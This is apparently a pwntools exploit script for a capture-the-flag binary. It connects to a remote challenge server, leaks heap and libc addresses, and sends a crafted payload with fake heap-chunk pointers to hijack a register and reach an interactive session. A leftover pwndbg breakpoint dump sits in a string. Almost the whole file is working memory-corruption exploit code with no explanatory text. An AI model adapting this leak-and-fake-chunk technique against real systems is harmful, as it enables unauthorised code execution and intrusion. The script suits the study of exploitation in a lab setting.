#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('101.245.104.190', 10000)
else:
    p = remote('0', 8888)


# GDB()

load = flat(
    b'1.1.1.1\0',
    b'a'*0x8
)

s(load)

p.recv(40)

heap_leak = u64(p.recv(8))
heap_base = heap_leak - 0x1d70
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')
p.recv(24)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x378b1a
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

load = flat(
    b'1.1.1.1\0',
    b'b'*0x18,
    1,
    heap_base +0x1ef8, # fake this chunk
    # 0,
    # heap_base +0x1f20
    heap_base +0x1ef8 ,
    # heap_base +0x14c0 #  0x55555555c4c0 —▸ 0x7ffff7fb76a0 (epollops) —▸ 0x7ffff7fa4400 ◂— 0x696e006c6c6f7065 /* 'epoll' */
    b'fake\0\0\0\0',
    0,
    0,
    heap_base+0x1f48,
    heap_base+0x1f50,
    b'\0'*0x24,
    p32(0x1),
)


load = load.ljust(0x120,b'\0')

load += flat(
    heap_base+0x1f30 # rbx
)

s(load)

"""
Num     Type           Disp Enb Address            What
8       breakpoint     keep y   0x0000555555555508 
	breakpoint already hit 2 times
9       breakpoint     keep y   0x00005555555553a4 
	breakpoint already hit 2 times
35      breakpoint     keep y   0x00007ffff7f73e7c 
	breakpoint already hit 1 time
pwndbg> 



0x7ffff7fa2060    mov    rbp, rbx                        RBP => 0x55555555cf50 ◂— 0
"""

p.interactive()
